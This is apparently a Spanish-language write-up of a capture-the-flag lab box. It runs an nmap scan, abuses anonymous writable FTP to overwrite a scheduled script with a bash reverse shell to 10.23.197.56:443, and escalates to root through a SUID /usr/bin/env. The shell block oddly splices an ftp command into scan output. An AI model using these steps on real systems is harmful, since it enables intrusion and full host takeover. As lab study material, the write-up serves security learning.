
---

- Escaneo de Puertos

```bash
❯ cd nmap
❯ ftp 10.201.34.27
Connected to 10.201.34.27.
  GNU nano 7.2                                                                          Targeted                                                                                       
Not shown: 65493 closed tcp ports (reset), 40 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.23.197.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pS>
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 25 18:17:44 2025 -- 1 IP address (1 host up) scanned in 35.40 seconds

```

- Encontramos que el puerto 21 tiene sesion abierta con el usuario "Anonymous"

- Entramos y vemos un directorio scripts y unos scripts los cuales se ejecutan periódicamente por lo que cambiamos el contenido del script de bash y le ponemos una reverse shell de esta forma:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.23.197.56/443 0>&1        # Este es el codigo que normalmente se ejecuta         

```

*Después subimos el archivo por ftp SIN BORRAR el que ya estaba, solo lo colocamos con el comando put clean.sh, con el mismo nombre de script*

- Nos ponemos en escucha y esto no dara una reverse shell, procedemoos con la escalda de privilegios de la siguiente forma:

```bash

find / -perm -4000 2>/dev/null    # Buscamos binarios con permisos SUID y encontramos /usr/bin/env

/usr/bin/env /bin/sh -p           # Procedemos con la escalda de privilegios 
```

